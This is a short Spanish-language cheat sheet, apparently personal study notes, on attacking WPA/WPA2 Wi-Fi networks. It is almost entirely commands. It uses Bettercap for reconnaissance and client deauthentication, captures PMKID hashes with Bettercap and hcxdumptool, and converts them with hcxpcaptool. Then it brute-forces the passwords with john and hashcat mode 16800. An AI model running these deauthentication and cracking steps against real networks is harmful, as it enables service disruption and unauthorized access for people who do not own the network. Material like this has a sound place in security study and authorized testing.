# Ataques 

Tags: #Bettercap #Attack #WPA/WPA2 

##  Bettercap 

* [Bettercap](https://github.com/bettercap/bettercap)
* [How to use - Bettercap](https://null-byte.wonderhowto.com/how-to/hack-wi-fi-networks-with-bettercap-0194422/)

```bash 
# Para descargar 'Bettercap' lo hacemos desde la url en 'releases' y lo colocamos en la carpeta /opt/ 

❯ ./bettercap -iface wlan0mon                        # Ingresar a la consola intercativa 
	❯ wifi.recon on                                 # Activamos el modo reconocimiento  
	❯ set wifi.show.sort clients desc               # Ordenar por clientes de modo descendiente 
	❯ set ticker.commands 'clear: wifi.show'        # Limpieza cada seg y que nos muestre las redes disponibles 
		❯ ticker on                                # Representa la info en forma de tablas 
	❯ wifi.recon.channel 1                          # Enfocarnos en el canal 1
	❯ wifi.deauth <BSSI>                            # Haremos un ataque de deatenticacion 
	❯ Ctrl + z                                      # Terminar la sesion 
		❯ kill %                                   # Matar el proceso en segundo plano                      
```


## Obtener los hashes de las redes 

```bash 
# Ataque con Bettercap 

❯ ./bettercap -iface wlan0mon                        # Ingresar a la consola intercativa 
	❯ wifi.recon on                                 # Activamos el modo reconocimiento
	❯ wifi.show                                     # Listamos las redes 
	❯ wifi.assoc all                                # Obtenemos los hashes de las redes listadas anteriores (RSN PMKID)
```

```bash 
# Obtenemos el hash de las redes 

❯ hcxdumptool -i wlan0mon -o <Captura> --enable_status=1
	# i = Tarjeta de red en modo monitor
	# o = Nombre del archivo de exportacion 
```

```bash 
# Nos crea un archivo con Hashes que despues debemos de crackear por fuerza bruta 

❯ hcxpcaptool -z <myHashes> <Captura>
	# z = Archivo donde nos exportara los hashes
	# La 'Captura' es de la herramienta anterior  
```

```bash 
❯ john --wordlist==diccionario.txt myHashes              # Crackeamos los hashes para obtener la passwd 
❯ hashcat -m 16800 -a 0 myHashes diccionario.txt         # Crackeamos los hashes para obtener la passwd 
```